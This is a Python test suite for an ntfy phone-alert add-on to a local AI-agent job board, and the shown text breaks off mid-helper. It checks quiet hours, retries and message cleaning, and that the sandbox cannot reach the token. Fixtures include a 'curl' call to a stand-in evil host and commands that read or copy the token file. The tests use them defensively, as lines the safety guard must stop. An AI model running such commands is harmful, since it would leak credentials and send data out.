"""Upgrade 9b: phone alerts (ntfy) - web/notifycfg.py and the "# U09b" hooks in jobboard.py.

The engine (settings dataclass, validation, quiet hours, message cleaning, 3 tries) is
`agentjobs_upgrades/notify.py` and is pinned in test_rest.py. These tests are about the glue and
about what the phone actually gets:

  * an empty server means OFF: nothing is ever sent; a missing or broken settings file is "off",
    not an error; NTFY_SERVER/NTFY_TOPIC only seed the very first file
  * one message per event the spec names - job finished (checks counts), a job waiting for you,
    safety stop, bench verdict, morning report, model server down - with status words and counts
    only. Log text, code, file paths and the access token never reach the phone.
  * quiet hours hold everything back except a safety stop
  * a send that fails is tried 3 times and lands in state/notify-log.jsonl; a send that hangs or
    dies runs on the board's own thread, so it never holds up or fails a job
  * the settings (and the token) live outside anything the sandbox mounts, are 0600, are never
    shown back in the page, and the safety guard stops a job that reaches for them; nothing the
    jail itself runs mentions the notifier, so only the board can buzz the phone
  * the Phone page and its POST need the upgrade 8 session + form token

Nothing here opens a network connection: every send goes through a fake sender, and the real one
(notify._post) is swapped out for the whole module, so a test that forgets it fails at the end of
the run instead of dialling a server.
"""
import http.server
import json
import os
import queue
import re
import shutil
import socket
import stat
import subprocess
import sys
import tempfile
import threading
import time
import unittest
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime
from pathlib import Path
from unittest import mock

import decisions
import jobboard
import notifycfg
from agentjobs_upgrades import notify, watchdog

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

SERVER = "http://192.168.1.9:2586"
TOPIC = "aj-test-topic-0001"
TOKEN = "ntfy-bearer-secret-42"
JID = "20261112-091500-ab12"


# No test in this file may reach the wire. notifycfg._send falls back to notify._post when a
# caller passes no sender, so the real one is swapped out for the whole module: a test that
# forgets its fake sender fails here instead of dialling a server from the suite.
_real_post_calls = []
_post_patch = None


def _never_post(server, body, token):
    _real_post_calls.append(server)
    raise AssertionError("a test tried to use the real ntfy sender")


def setUpModule():
    global _post_patch
    _real_post_calls.clear()
    _post_patch = mock.patch.object(notify, "_post", _never_post)
    _post_patch.start()


def tearDownModule():
    _post_patch.stop()
    if _real_post_calls:
        raise AssertionError(f"{len(_real_post_calls)} test(s) reached notify._post: "
                             f"{_real_post_calls[:3]}")


def wait_for(pred, secs=10.0):
    end = time.time() + secs
    while time.time() < end:
        if pred():
            return True
        time.sleep(0.02)
    return False


def drain_queue():
    """The send queue and its worker thread belong to the module, not to one test: throw away
    anything a previous test left in flight so a background test is not queued behind it."""
    while True:
        try:
            notifycfg._q.get_nowait()
        except queue.Empty:
            return


# ------------------------------------------------------------------ helpers

def free_port():
    s = socket.socket(); s.bind(("127.0.0.1", 0)); p = s.getsockname()[1]; s.close(); return p


class FakePost:
    """Stands in for notify._post: records what would have gone over the wire, sends nothing."""

    def __init__(self, fail_with=None, delay=0.0):
        self.calls = []
        self.fail_with = fail_with
        self.delay = delay

    def __call__(self, server, body, token):
        self.calls.append({"server": server, "body": body, "token": token,
                           "thread": threading.current_thread().name})
        if self.delay:
            time.sleep(self.delay)
        if self.fail_with:
            raise self.fail_with

    @property
    def sent(self):
        return len(self.calls)

    @property
    def body(self):
        return self.calls[-1]["body"]

    @property
    def text(self):
        b = self.body
        return f"{b.get('title')}\n{b.get('message')}"


def turned_on(path, **over):
    """Settings the way Jason would have left them: a server, so alerts are on."""
    kw = {"server": SERVER, "topic": TOPIC, "token": TOKEN}
    kw.update(over)
    notifycfg.save(path, notify.NotifySettings(**kw))
    return notifycfg.settings(path)


def daylight():
    """A quiet-hours window three hours ahead of wherever the test run happens to be, so a
    test that needs a send to go out is never at the mercy of the wall clock."""
    h = datetime.now().hour
    return {"quiet_start": f"{(h + 3) % 24:02d}:00", "quiet_end": f"{(h + 4) % 24:02d}:00"}


def record(status="done", verify=None, **over):
    """A finished job record, in the shape jobboard.py writes it."""
    t = time.time()
    m = {"id": JID, "kind": "agent", "mode": "local-qwen", "folder": "notes",
         "job": "Add the export button", "status": status, "offline": False,
         "created": t - 900, "started": t - 900, "exit": 0,
         "finished": None if status in ("queued", "running", "stopping") else t - 60}
    if verify:
        m["verify"] = verify
    m.update(over)
    return m


PASSED_VERIFY = {"status": "passed",
                 "final": {"status": "passed", "results": [
                     {"name": "tests", "cmd": "python3 -m unittest", "ok": True,
                      "passed": 42, "failed": 0, "skipped": 1, "exit_code": 0}]}}
DIRTY_TRACE = ('Traceback (most recent call last):\n'
               '  File "/home/jason/agent-work/notes/app.py", line 12, in export\n'
               '    assert row.token == "abc123secret"\n'
               'AssertionError: abc123secret expected')
FAILED_VERIFY = {"status": "failed", "banner": {"colour": "red", "text": "Checks failed: tests"},
                 "final": {"status": "failed", "results": [
                     {"name": "tests", "cmd": "python3 -m unittest", "ok": False, "passed": 10,
                      "failed": 3, "exit_code": 1, "first_error": DIRTY_TRACE, "mode": "required"},
                     {"name": "lint", "cmd": "ruff check .", "ok": True, "passed": 5,
                      "failed": 0, "exit_code": 0}]}}


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


OPENER = urllib.request.build_opener(NoRedirect)


# ------------------------------------------------------------------ settings

class Settings(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="u09b-"))
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        self.path = self.tmp / "notify-settings.json"

    def test_nothing_is_set_up_so_the_phone_is_off(self):
        s = notifycfg.settings(self.path)
        self.assertEqual(s.server, "")
        self.assertEqual(notify.validate(s), [])
        self.assertIn("Off", notifycfg.status_line(self.path))

    def test_no_server_means_no_send_even_for_a_safety_stop(self):
        fake = FakePost()
        for ev in sorted(notify.EVENTS):
            self.assertFalse(notifycfg.push(self.path, ev, "T", ["a line"], JID,
                                            post=fake, background=False), ev)
        self.assertEqual(fake.sent, 0, "an unset server must never touch the network")

    def test_a_broken_settings_file_is_off_not_a_crash(self):
        self.path.write_text("{not json at all", encoding="utf-8")
        self.assertEqual(notifycfg.settings(self.path).server, "")
        self.assertIn("Off", notifycfg.status_line(self.path))

    def test_the_environment_only_seeds_the_first_file(self):
        env = {"NTFY_SERVER": SERVER, "NTFY_TOPIC": "seeded-topic-name-1"}
        with mock.patch.dict(os.environ, env):
            s = notifycfg.settings(self.path)
            self.assertEqual(s.server, SERVER)
            self.assertEqual(s.topic, "seeded-topic-name-1")
            turned_on(self.path, server="", topic="aj-kept-topic-0002")
            s2 = notifycfg.settings(self.path)
            self.assertEqual(s2.server, "")
            self.assertEqual(s2.topic, "aj-kept-topic-0002")

    def test_the_topic_starts_random_and_is_not_guessable(self):
        a = notifycfg.settings(self.path).topic
        self.assertRegex(a, r"^aj-[a-z0-9]{20}$")
        self.assertNotEqual(notify.random_topic(), notify.random_topic())

    def test_the_settings_file_is_written_0600_and_reads_back(self):
        turned_on(self.path, base_url="http://192.168.1.20:8090")
        self.assertEqual(stat.S_IMODE(self.path.stat().st_mode), 0o600)
        s = notifycfg.settings(self.path)
        self.assertEqual((s.server, s.topic, s.token), (SERVER, TOPIC, TOKEN))
        self.assertEqual(s.events, set(notify.EVENTS))
        self.assertEqual((s.quiet_start, s.quiet_end), ("22:00", "07:00"))
        self.assertEqual(s.base_url, "http://192.168.1.20:8090")

    def test_the_form_is_validated_before_anything_is_saved(self):
        cases = (({"server": ["ftp://box:2586"], "topic": [TOPIC]}, "http://"),
                 ({"server": [SERVER], "topic": ["short"]}, "Topic"),
                 ({"server": [SERVER], "topic": ["has spaces in it"]}, "Topic"),
                 ({"server": [SERVER], "topic": [TOPIC], "quiet_start": ["25:00"]}, "25:00"),
                 ({"server": [SERVER], "topic": [TOPIC], "quiet_end": ["7pm"]}, "7pm"))
        for form, want in cases:
            errs, _test = notifycfg.save_form(self.path, form)
            self.assertTrue(errs, form)
            self.assertIn(want, " ".join(errs))
        self.assertFalse(self.path.exists(), "a typo must not switch the phone off by saving")

    def test_a_blank_token_or_topic_keeps_the_saved_one(self):
        turned_on(self.path)
        errs, _ = notifycfg.save_form(self.path, {"server": [SERVER], "topic": [""],
                                                  "token": [""], "quiet_start": ["23:30"],
                                                  "quiet_end": ["06:30"], "job_finished": ["1"]})
        self.assertEqual(errs, [])
        s = notifycfg.settings(self.path)
        self.assertEqual(s.token, TOKEN)
        self.assertEqual(s.topic, TOPIC)
        self.assertEqual((s.quiet_start, s.quiet_end), ("23:30", "06:30"))
        self.assertEqual(s.events, {"job_finished"})

    def test_clearing_the_server_switches_the_phone_off(self):
        turned_on(self.path)
        errs, _ = notifycfg.save_form(self.path, {"server": [""], "topic": [TOPIC]})
        self.assertEqual(errs, [])
        self.assertEqual(notifycfg.settings(self.path).server, "")
        self.assertIn("Off", notifycfg.status_line(self.path))

    def test_the_test_button_says_why_it_could_not_send(self):
        sent, why = notifycfg.send_test(self.path, post=FakePost(), background=False)
        self.assertFalse(sent)
        self.assertIn("no server set", why)
        turned_on(self.path, topic="bad topic")
        sent2, why2 = notifycfg.send_test(self.path, post=FakePost(), background=False)
        self.assertFalse(sent2)
        self.assertIn("Topic", why2)


# ------------------------------------------------------------------ what the phone shows

class Messages(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="u09b-msg-"))
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        self.path = self.tmp / "notify-settings.json"
        turned_on(self.path)
        self.now = datetime(2026, 11, 12, 12, 0)      # midday: not quiet hours

    def send(self, m, extra="", fake=None, **kw):
        fake = fake or FakePost()
        kw.setdefault("now", self.now)
        ok = notifycfg.job_done(m, self.path, extra, post=fake, background=False, **kw)
        return fake, ok

    def test_a_finished_job_is_a_tick_and_the_checks_counts(self):
        fake, ok = self.send(record(verify=PASSED_VERIFY))
        self.assertTrue(ok and fake.sent == 1)
        b = fake.body
        self.assertEqual(b["title"], "Job finished ✓")
        self.assertIn("Add the export button", b["message"])
        self.assertIn("Checks passed - 42 tests", b["message"])
        self.assertEqual(b["tags"], ["robot"])
        self.assertEqual(b["priority"], 3)

    def test_a_failed_job_is_a_cross_and_the_counts_never_its_log(self):
        m = record(status="failed", verify=FAILED_VERIFY,
                   fail_note="Checks failed: tests (the log has the whole traceback)")
        fake, ok = self.send(m)
        self.assertTrue(ok)
        text = fake.text
        self.assertEqual(fake.body["title"], "Job failed ✗")
        self.assertIn("1 of 2 checks failed - 3 tests failing", text)
        for dirt in ("Traceback", "AssertionError", "/home/jason", "abc123secret",
                     "assert row", "app.py", "traceback"):
            self.assertNotIn(dirt, text, dirt)

    def test_a_checks_rerun_is_what_the_phone_counts(self):
        m = record(status="done", verify=FAILED_VERIFY,
                   recheck={"summary": {"status": "passed", "results": [
                       {"name": "tests", "ok": True, "passed": 17, "failed": 0}]}})
        fake, _ok = self.send(m)
        self.assertEqual(fake.body["title"], "Job finished ✓")
        self.assertIn("Checks passed - 17 tests", fake.body["message"])

    def test_a_job_that_needs_your_ok_uses_the_needs_approval_event(self):
        v = dict(PASSED_VERIFY, status="needs_review",
                 issues=[{"name": "tests", "why": "the test file changed"}])
        fake, _ok = self.send(record(verify=v))
        self.assertEqual(fake.body["title"], "Waiting for you")
        self.assertEqual(fake.body["priority"], 4)
        self.assertEqual(fake.body["tags"], ["eyes"])
        self.assertIn("needs your OK", fake.body["message"])

    def test_a_job_someone_asked_for_changes_on_is_still_waiting(self):
        v = dict(PASSED_VERIFY, status="unverified")
        fake, _ok = self.send(record(verify=v, approval="waiting"))
        self.assertEqual(fake.body["title"], "Waiting for you")

    def test_a_safety_stop_is_louder_and_names_no_command(self):
        m = record(status="safety_stop",
                   watchdog=[{"time": time.time(), "kind": "safety_stop",
                              "reason": "Safety stop: tried to reach https://evil.example/x",
                              "command": "curl -s https://evil.example/x"}],
                   fail_note="Safety stop: tried to reach https://evil.example/x")
        fake, ok = self.send(m)
        self.assertTrue(ok)
        self.assertEqual(fake.body["title"], "Safety stop")
        self.assertEqual(fake.body["priority"], 5)
        self.assertEqual(fake.body["tags"], ["no_entry"])
        self.assertIn("The safety guard stopped this job.", fake.body["message"])
        for dirt in ("curl", "evil", "https", "Traceback"):
            self.assertNotIn(dirt, fake.text, dirt)

    def test_a_bench_verdict_is_its_own_event(self):
        fake, ok = self.send(record(status="done", kind="bench", job="bench draft6"),
                             extra="overall 3.4 \u00b1 0.5")
        self.assertTrue(ok)
        self.assertEqual(fake.body["title"], "Bench run finished \u2713")
        self.assertEqual(fake.body["tags"], ["bar_chart"])
        self.assertIn("bench draft6", fake.body["message"])
        self.assertIn("overall 3.4 +/- 0.5", fake.body["message"])

    def test_a_bench_run_that_died_says_so(self):
        fake, _ok = self.send(record(status="failed", kind="bench", job="draft6",
                                     fail_note="Basalt stopped answering - press Resume"))
        self.assertEqual(fake.body["title"], "Bench run failed \u2717")

    def test_the_morning_report_push_is_counts_only(self):
        fake = FakePost()
        self.assertTrue(notifycfg.report_ready(self.path, lines=["2 done, 1 failed since 07:00",
                                                                "1 waiting for you"],
                                               post=fake, background=False, now=self.now))
        self.assertEqual(fake.body["title"], "Morning report ready")
        self.assertEqual(fake.body["tags"], ["sunrise"])
        self.assertIn("2 done, 1 failed", fake.body["message"])

    def test_the_model_down_push_names_no_log_text(self):
        fake = FakePost()
        turned_on(self.path, **daylight())      # these three use the real clock
        sent = notifycfg.model_check(self.path, lambda: False, state={}, min_gap_s=0.0,
                                     post=fake, background=False)
        self.assertTrue(sent)
        self.assertEqual(fake.body["title"], "Model server down")
        self.assertEqual(fake.body["tags"], ["warning"])
        self.assertIn("not answering", fake.body["message"])
        self.assertNotIn("8080", fake.text)

    def test_the_model_down_alert_comes_once_while_it_stays_down(self):
        turned_on(self.path, **daylight())      # these three use the real clock
        fake, st = FakePost(), {}
        clock = {"t": 1000.0}

        def ping():
            return False
        clock["t"] = 1000.0
        self.assertTrue(notifycfg.model_check(self.path, ping, state=st, min_gap_s=0.0, post=fake,
                                              background=False, now=lambda: clock["t"]))
        clock["t"] += 3600
        self.assertIsNone(notifycfg.model_check(self.path, ping, state=st, min_gap_s=0.0,
                                                post=fake, background=False,
                                                now=lambda: clock["t"]),
                          "not one buzz every minute while it stays down")
        self.assertEqual(fake.sent, 1)
        self.assertIsNone(notifycfg.model_check(self.path, lambda: True, state=st, min_gap_s=0.0,
                                                post=fake, background=False,
                                                now=lambda: clock["t"]),
                          "it coming back is not an alert")
        clock["t"] += 3600
        self.assertTrue(notifycfg.model_check(self.path, ping, state=st, min_gap_s=0.0, post=fake,
                                              background=False, now=lambda: clock["t"]),
                        "a second failure is worth another buzz")
        self.assertEqual(fake.sent, 2)

    def test_the_model_check_asks_at_most_once_a_minute(self):
        fake, asked, st, clock = FakePost(), [], {}, {"t": 500.0}

        def ping():
            asked.append(clock["t"])
            return False
        notifycfg.model_check(self.path, ping, state=st, post=fake, background=False,
                              now=lambda: clock["t"])
        clock["t"] += 5
        notifycfg.model_check(self.path, ping, state=st, post=fake, background=False,
                              now=lambda: clock["t"])
        self.assertEqual(asked, [500.0], "the worker loop runs every few seconds")

    def test_nothing_is_ever_asked_of_the_model_when_alerts_are_off(self):
        asked = []
        self.assertIsNone(notifycfg.model_check(self.tmp / "other.json",
                                                lambda: asked.append(1) or False))
        self.assertEqual(asked, [])

    def test_events_Jason_did_not_tick_never_go_out(self):
        turned_on(self.path, events={"safety_stop"})
        fake = FakePost()
        self.assertFalse(notifycfg.job_done(record(verify=PASSED_VERIFY), self.path,
                                            post=fake, background=False, now=self.now))
        self.assertEqual(fake.sent, 0)

    def test_a_job_you_stopped_yourself_and_a_job_still_running_stay_quiet(self):
        fake = FakePost()
        for st in ("stopped", "cancelled", "interrupted", "queued", "running", "stopping"):
            self.assertFalse(notifycfg.job_done(record(status=st), self.path, post=fake,
                                                background=False, now=self.now), st)
        self.assertEqual(fake.sent, 0)

    def test_a_message_is_two_lines_of_safe_text(self):
        m = record(job="Fix /home/jason/agent-work/notes/app.py `assert x` for issue #42 (50%)",
                   verify=FAILED_VERIFY)
        fake, _ok = self.send(m)
        b = fake.body
        self.assertLessEqual(len(b["title"]), 80)
        self.assertLessEqual(len(b["message"].splitlines()), 2)
        self.assertNotIn("/home", b["message"] + b["title"])
        self.assertNotIn("`", b["message"] + b["title"])

    def test_a_link_is_added_only_when_the_phone_can_reach_the_board(self):
        fake, _ok = self.send(record(verify=PASSED_VERIFY))
        self.assertNotIn("click", fake.body)
        turned_on(self.path, base_url="http://192.168.1.20:8090/")
        fake2, _ok2 = self.send(record(verify=PASSED_VERIFY))
        self.assertEqual(fake2.body["click"], f"http://192.168.1.20:8090/jobs/{JID}")

    def test_the_access_token_is_never_part_of_the_message(self):
        fake, _ok = self.send(record(verify=PASSED_VERIFY))
        self.assertEqual(fake.calls[-1]["token"], TOKEN)
        self.assertEqual(fake.calls[-1]["server"], SERVER)
        self.assertNotIn(TOKEN, json.dumps(fake.body))


class QuietHours(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="u09b-quiet-"))
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        self.path = self.tmp / "notify-settings.json"
        turned_on(self.path)

    def test_quiet_hours_hold_everything_back_except_a_safety_stop(self):
        night = datetime(2026, 11, 12, 23, 30)
        fake = FakePost()
        self.assertFalse(notifycfg.job_done(record(verify=PASSED_VERIFY), self.path,
                                            post=fake, background=False, now=night))
        self.assertFalse(notifycfg.job_done(record(verify=FAILED_VERIFY), self.path,
                                            post=fake, background=False, now=night))
        self.assertEqual(fake.sent, 0, "nothing went out during quiet hours")
        self.assertTrue(notifycfg.job_done(record(status="safety_stop"), self.path,
                                           post=fake, background=False, now=night))
        self.assertEqual(fake.sent, 1, "a safety stop arrives in quiet hours too")
        self.assertEqual(fake.body["title"], "Safety stop")
        self.assertFalse(notifycfg.job_done(record(status="done", kind="bench", job="d6"),
                                            self.path, post=fake, background=False, now=night))
        self.assertEqual(fake.sent, 1)

    def test_a_window_that_wraps_past_midnight_is_read_the_right_way(self):
        s = notifycfg.settings(self.path)
        at = lambda h, mi: datetime(2026, 11, 12, h, mi)
        for quiet, when in ((True, at(22, 0)), (True, at(2, 0)), (True, at(23, 59)),
                            (False, at(12, 0)), (False, at(7, 0)), (False, at(21, 59))):
            self.assertEqual(notify.in_quiet_hours(s, when), quiet, when)

    def test_the_page_says_it_is_quiet(self):
        turned_on(self.path, quiet_start="00:00", quiet_end="23:59")
        self.assertIn("quiet until", notifycfg.status_line(self.path, datetime(2026, 11, 12, 12, 0)))

    def test_a_test_you_pressed_on_purpose_is_not_swallowed_by_quiet_hours(self):
        for window in (("00:00", "23:59"), ("22:00", "07:00"), ("00:00", "23:59")):
            turned_on(self.path, quiet_start=window[0], quiet_end=window[1])
            fake = FakePost()
            ok, why = notifycfg.send_test(self.path, "job_finished", post=fake, background=False)
            self.assertTrue(ok, f"{window}: {why}")
            self.assertEqual(fake.sent, 1, window)


# ------------------------------------------------------------------ a send that fails

class Failure(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="u09b-fail-"))
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        self.path = self.tmp / "notify-settings.json"
        turned_on(self.path, **daylight())         # these tests need the send to be attempted
        self.log = self.tmp / "notify-log.jsonl"
        drain_queue()

    def rows(self):
        if not self.log.exists():
            return []
        return [json.loads(ln) for ln in self.log.read_text(encoding="utf-8").splitlines()]

    def waited_for_row(self, n=1):
        return wait_for(lambda: len(self.rows()) >= n, 15.0)

    def test_a_failed_send_is_tried_three_times_and_logged(self):
        fake = FakePost(fail_with=ConnectionRefusedError("connection refused"))
        naps = []
        ok = notifycfg.push(self.path, "job_finished", "Job finished \u2713", ["Checks passed"],
                            JID, post=fake, background=False, sleep=naps.append)
        self.assertFalse(ok)
        self.assertEqual(fake.sent, 3, "the spec's three tries")
        self.assertEqual(naps, [1, 2], "with a wait between the tries")
        rows = self.rows()
        self.assertEqual(len(rows), 1)
        self.assertFalse(rows[0]["ok"])
        self.assertEqual(rows[0]["event"], "job_finished")
        self.assertIn("connection refused", rows[0]["note"])

    def test_a_send_held_up_by_an_unreachable_phone_never_holds_up_the_job(self):
        fake = FakePost(delay=1.5)
        started = time.time()
        ok = notifycfg.push(self.path, "job_finished", "Job finished \u2713", ["Checks passed"],
                            JID, post=fake)                    # background, as the worker calls it
        took = time.time() - started
        self.assertTrue(ok)
        self.assertLess(took, 0.5, "the caller must not wait for the phone")
        self.assertTrue(self.waited_for_row(), "the send still happens")
        self.assertEqual(fake.sent, 1)
        self.assertNotEqual(fake.calls[0]["thread"], threading.current_thread().name,
                            "the send runs on the board's own thread, never in a job")
        self.assertTrue(self.rows()[-1]["ok"])

    def test_a_sender_that_dies_on_the_background_thread_is_only_a_log_line(self):
        fake = FakePost(fail_with=RuntimeError("the topic is gone"))
        notifycfg.push(self.path, "job_finished", "T", ["line"], JID, post=fake,
                       retries=1, sleep=lambda s: None)
        self.assertTrue(self.waited_for_row())
        self.assertFalse(self.rows()[-1]["ok"])
        self.assertIn("the topic is gone", self.rows()[-1]["note"])

    def test_a_full_send_queue_drops_the_alert_not_the_caller(self):
        with mock.patch.object(notifycfg._q, "put_nowait", side_effect=queue.Full):
            self.assertFalse(notifycfg.push(self.path, "job_finished", "T", ["line"], JID,
                                            post=FakePost()))

    def test_a_quiet_hours_hiding_is_a_row_that_says_why(self):
        # A window written out, not daylight(): 03:00 has to be quiet wherever the clock stood
        # when the suite started, or this row depends on the time of day the job ran at.
        turned_on(self.path, quiet_start="02:00", quiet_end="04:00")
        notifycfg.push(self.path, "job_finished", "Job finished \u2713", ["Checks passed"], JID,
                       post=FakePost(), background=False, now=datetime(2026, 11, 12, 3, 0))
        row = self.rows()[-1]
        self.assertFalse(row["ok"])
        self.assertIn("quiet hours", row["note"])
        fake = FakePost()
        self.assertTrue(notifycfg.push(self.path, "safety_stop", "Safety stop", ["A stop"], JID,
                                       post=fake, background=False, now=datetime(2026, 11, 12, 3, 0)))
        self.assertEqual(fake.sent, 1, "a safety stop is not held back by the log row either")
        self.assertNotIn("quiet hours", self.rows()[-1]["note"])

    def test_the_recent_sends_are_the_last_ones_newest_first(self):
        notifycfg.log_send(self.path, "job_finished", True, "")
        notifycfg.log_send(self.path, "safety_stop", False, "connection refused")
        rows = notifycfg.recent(self.path)
        self.assertEqual([r["event"] for r in rows], ["safety_stop", "job_finished"])
        self.assertEqual(notifycfg.recent(self.tmp / "elsewhere" / "none.json"), [])


# ------------------------------------------------------------------ the board's own hooks

class BoardHooks(unittest.TestCase):
    """The "# U09b" hooks in jobboard.py: what the worker actually calls."""

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="u09b-hook-"))
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        self.saved = (jobboard.NOTIFY_FILE, jobboard.BENCH_RUNS)
        jobboard.NOTIFY_FILE = self.tmp / "notify-settings.json"
        jobboard.BENCH_RUNS = self.tmp / "runs"; jobboard.BENCH_RUNS.mkdir()

    def tearDown(self):
        jobboard.NOTIFY_FILE, jobboard.BENCH_RUNS = self.saved

    def test_the_finish_hook_hands_the_record_to_the_phone(self):
        got = []
        turned_on(jobboard.NOTIFY_FILE)
        with mock.patch.object(notifycfg, "job_done",
                               side_effect=lambda m, p, extra="", **kw: got.append((m["id"], p, extra))):
            jobboard.phone_notify(record(verify=PASSED_VERIFY))
        self.assertEqual(got, [(JID, jobboard.NOTIFY_FILE, "")])

    def test_the_hook_survives_a_broken_record_and_a_broken_settings_file(self):
        jobboard.NOTIFY_FILE = self.tmp / "no-such-dir" / "notify-settings.json"
        jobboard.phone_notify(record(verify=PASSED_VERIFY))          # must not raise
        turned_on(self.tmp / "off.json")                             # not the file in use
        jobboard.NOTIFY_FILE = self.tmp / "off.json"
        fake = FakePost()
        drain_queue()
        with mock.patch.object(notify, "_post", fake):               # a fake sender, not the wire
            jobboard.phone_notify(record(status="safety_stop"))
            self.assertTrue(wait_for(lambda: fake.sent >= 1),
                            "the hook queued it: the board sends, on its own thread")
        self.assertNotEqual(fake.calls[0]["thread"], threading.current_thread().name)

    def test_the_worker_hook_pings_the_model_server_and_buzzes_once(self):
        turned_on(jobboard.NOTIFY_FILE)
        pushes = []
        state = {}
        status = {"v": "offline"}
        with mock.patch.object(jobboard, "basalt_status", lambda: status["v"]), \
             mock.patch.object(notifycfg, "MODEL_STATE", state), \
             mock.patch.object(notifycfg, "push",
                               side_effect=lambda p, ev, t, lines, jid="", **kw:
                               pushes.append(ev) or True):
            for _ in range(5):
                jobboard.phone_model_check()
            self.assertEqual(pushes, ["model_down"])
            status["v"] = "loaded"
            notifycfg.MODEL_STATE["last_ping"] = 0.0
            jobboard.phone_model_check()
            status["v"] = "offline"
            notifycfg.MODEL_STATE["last_ping"] = 0.0
            jobboard.phone_model_check()
            self.assertEqual(pushes, ["model_down", "model_down"], "back, then down again")

    def test_the_worker_hook_asks_nothing_when_the_phone_is_off(self):
        notifycfg.save(jobboard.NOTIFY_FILE, notify.NotifySettings())
        asked = []
        with mock.patch.object(jobboard, "basalt_status", side_effect=lambda: asked.append(1)):
            jobboard.phone_model_check()
        self.assertEqual(asked, [], "an off phone must not make the worker ping the model")


# ------------------------------------------------------------------ out of the sandbox's reach

class SandboxReach(unittest.TestCase):
    def test_the_phone_settings_live_where_the_agent_cannot_read_them(self):
        home = Path(tempfile.mkdtemp(prefix="jb09b-def-"))
        env = dict(os.environ, HOME=str(home), JOBBOARD_READONLY="1")
        for k in ("JOBBOARD_NOTIFY", "JOBBOARD_JOBS", "JOBBOARD_WORK"):
            env.pop(k, None)
        r = subprocess.run([sys.executable, "-c",
                            "import jobboard; print(jobboard.NOTIFY_FILE); print(jobboard.WORK)"],
                           env=env, capture_output=True, text=True, cwd=str(ROOT), timeout=120)
        self.assertEqual(r.returncode, 0, r.stderr)
        notify_file, work = r.stdout.split()
        self.assertEqual(notify_file, str(home / "agent-sandbox" / "state" / "notify-settings.json"))
        self.assertFalse(Path(notify_file).is_relative_to(work), "the sandbox mounts ~/agent-work")
        # jail/podman-local.sh mounts only state/home-local and state/android-sdk from state/
        for mounted in ("home-local", "android-sdk"):
            self.assertFalse(Path(notify_file).is_relative_to(
                home / "agent-sandbox" / "state" / mounted), mounted)

    def test_a_job_that_reaches_for_the_token_file_is_stopped(self):
        cmds = ("cat ~/agent-sandbox/state/notify-settings.json",
                "cat /home/jason/agent-sandbox/state/notify-settings.json",
                "cp $HOME/agent-sandbox/state/notify-settings.json /tmp/",
                "jq .token /root/agent-sandbox/state/notify-settings.json")
        for cmd in cmds:
            self.assertIn("private location", watchdog.safety_reason(cmd) or "", cmd)

    def test_the_other_private_files_are_still_stopped_and_a_normal_one_is_not(self):
        for cmd in ("cat ~/agent-sandbox/state/access-settings.json",
                    "cat ~/agent-sandbox/state/phone-sessions.json"):
            self.assertIn("private location", watchdog.safety_reason(cmd) or "", cmd)
        self.assertIsNone(watchdog.safety_reason("cat ~/agent-sandbox/state/agentjobs-settings.json"))

    def test_a_job_that_opens_the_token_file_by_path_is_stopped_too(self):
        reason = watchdog.path_reason("~/agent-sandbox/state/notify-settings.json", "/tmp/proj")
        self.assertIn("private location", reason or "")

    def test_nothing_the_sandbox_runs_sends_or_writes_a_report(self):
        """9b rule 4: the tool notifies, never the agent. Every file the jail hands the agent
        (the shims, the broker, the fake agent) must stay clear of the notifier - a job that
        could post to ntfy or write a report could say anything it liked to Jason's phone."""
        names = sorted({*(ROOT.parent / "jail").glob("*.py"),
                        *(ROOT.parent / "jail").glob("*.sh"),
                        *(ROOT.parent / "jail" / "shim").glob("*"),
                        ROOT / "agentjobs_upgrades" / "fakeagent.py"})
        self.assertTrue(names, "the jail files moved; update this list")
        for p in names:
            if not p.is_file():
                continue
            text = p.read_text(encoding="utf-8", errors="replace").lower()
            for word in ("notifycfg", "ntfy", "morningreport"):
                self.assertNotIn(word, text, f"{p} mentions {word}")


# ------------------------------------------------------------------ the live Phone page

class PhonePage(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = Path(tempfile.mkdtemp(prefix="jb09b-web-"))
        cls.saved = (jobboard.JOBS, jobboard.WORK, jobboard.PORT, jobboard.READONLY,
                     jobboard.NOTIFY_FILE, jobboard.ACCESS_FILE)
        jobboard.JOBS = cls.tmp / "jobs"; jobboard.JOBS.mkdir()
        jobboard.WORK = cls.tmp / "work"; jobboard.WORK.mkdir()
        jobboard.NOTIFY_FILE = cls.tmp / "notify-settings.json"
        jobboard.ACCESS_FILE = cls.tmp / "access-settings.json"
        jobboard.READONLY = False
        cls.port = free_port()
        jobboard.PORT = cls.port                       # guard() reads this per request
        cls.srv = http.server.ThreadingHTTPServer(("127.0.0.1", cls.port), jobboard.H)
        cls.thr = threading.Thread(target=cls.srv.serve_forever, daemon=True)
        cls.thr.start()

    @classmethod
    def tearDownClass(cls):
        cls.srv.shutdown(); cls.srv.server_close(); cls.thr.join(timeout=5)
        (jobboard.JOBS, jobboard.WORK, jobboard.PORT, jobboard.READONLY,
         jobboard.NOTIFY_FILE, jobboard.ACCESS_FILE) = cls.saved
        shutil.rmtree(cls.tmp, ignore_errors=True)

    def setUp(self):
        jobboard.NOTIFY_FILE = self.tmp / "notify-settings.json"
        notifycfg.save(jobboard.NOTIFY_FILE, notify.NotifySettings())      # off, as shipped
        self.sess = ""
        log = self.tmp / "notify-log.jsonl"
        if log.exists():
            log.unlink()

    def fetch(self, path, data=None, origin=None):
        body = urllib.parse.urlencode(data).encode() if data is not None else None
        req = urllib.request.Request(f"http://127.0.0.1:{self.port}{path}", data=body,
                                     method="POST" if body is not None else "GET")
        req.add_header("Cookie", f"jb={jobboard.TOKEN}{self.sess}")
        if origin:
            req.add_header("Origin", origin)
        try:
